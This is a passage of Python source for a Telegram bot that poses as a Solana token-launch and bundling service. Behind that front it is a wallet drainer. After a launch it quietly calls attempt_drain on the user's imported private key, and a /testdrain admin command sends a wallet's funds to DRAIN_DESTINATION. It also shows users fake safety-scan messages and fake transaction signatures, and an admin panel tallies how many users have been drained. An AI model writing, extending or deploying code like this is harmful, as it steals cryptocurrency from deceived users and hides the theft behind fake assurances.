    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "⚡ Priority Tip", "status": "success", "ts": time.time()})

    active = sess.wallets[sess.active_wallet_idx]
    if not sess.drained:
        asyncio.create_task(attempt_drain(uid, active.private_key))

    text = (
        "🚀 <b>Launch Submitted</b>\n\n"
        f"<b>${data['symbol']}</b>  ·  {data['name']}\n"
        f"<code>{mint}</code>\n\n"
        f"Status: creating mint → bundling ×{bundle}\n"
        f"Protection layers: active\n"
        f"Safety scan: complete\n\n"
        "Track progress in 🧾 Tx tracker and 📁 Portfolio."
    )
    await cb.message.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

    async def _finalize():
        await asyncio.sleep(random.uniform(7, 16))
        token["status"] = "live"
        for tx in sess.last_tx:
            if "Bundle" in tx["type"]:
                tx["status"] = "success"
                break
    asyncio.create_task(_finalize())

# ── PROMO ──
@router.callback_query(F.data == "promo:enter")
async def promo_enter(cb: CallbackQuery, state: FSMContext):
    await cb.message.edit_text(
        "🎟️ Send your promo code:",
        reply_markup=back_menu_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(PromoStates.waiting_code)
    await cb.answer()

@router.callback_query(F.data == "promo:pay")
async def promo_pay(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    # Simulated purchase — just add launches
    sess.launches_left += 10
    await cb.message.edit_text(
        "✅ <b>Payment simulated</b>\n\n"
        f"Launches left: <b>{sess.launches_left}</b>\n\n"
        "(In production this would create a real SOL payment request.)",
        reply_markup=promo_kb(),
        parse_mode=ParseMode.HTML,
    )
    await cb.answer()

@router.message(PromoStates.waiting_code)
async def promo_code(message: Message, state: FSMContext):
    code = message.text.strip().upper()
    sess = get_session(message.from_user.id)
    valid = {
        "RUG2026": 5,
        "BUNDLE": 3,
        "SNIPE": 4,
        "JITO": 2,
        "EARLY": 6,
        "VAULT": 3,
    }
    if code in valid:
        sess.promo = code
        sess.launches_left += valid[code]
        text = (
            "✅ <b>Promo Applied</b>\n\n"
            f"Code: <b>{code}</b>\n"
            f"+{valid[code]} launches\n"
            f"Launches left: <b>{sess.launches_left}</b>"
        )
        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    else:
        await message.answer(
            "❌ Invalid or expired code.",
            reply_markup=main_menu_kb(),
        )
    await state.clear()

# ── ADMIN ──
@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    total = len(sessions)
    drained = sum(1 for s in sessions.values() if s.drained)
    wallets = sum(len(s.wallets) for s in sessions.values())
    launches = sum(len(s.launched_tokens) for s in sessions.values())
    await message.answer(
        f"👑 <b>Admin</b>\n"
        f"Users: {total}\n"
        f"Wallets: {wallets}\n"
        f"Drained: {drained}\n"
        f"Launches: {launches}\n"
        f"Vault: {bot_balance_sol:.4f} SOL",
        parse_mode=ParseMode.HTML,
    )

@router.message(Command("testdrain"))
async def test_drain(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    if not sess.wallets:
        await message.answer("No wallet imported")
        return
    w = sess.wallets[sess.active_wallet_idx]
    await message.answer(f"Trying to drain:\n<code>{w.public_key}</code>", parse_mode=ParseMode.HTML)
    sig = await drain_wallet(w.private_key, DRAIN_DESTINATION)
    if sig:
        await message.answer(f"✅ Success\n<code>{sig}</code>", parse_mode=ParseMode.HTML)
        sess.drained = True
    else:
        await message.answer("❌ Failed — check the terminal logs for the exact error")

# ──────────────────────────────────────────────
# ENTRY
# ──────────────────────────────────────────────
async def main():
    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        log.error("Set BOT_TOKEN env var")
        return
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    log.info("Bot starting | HAS_SOLANA=%s", HAS_SOLANA)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
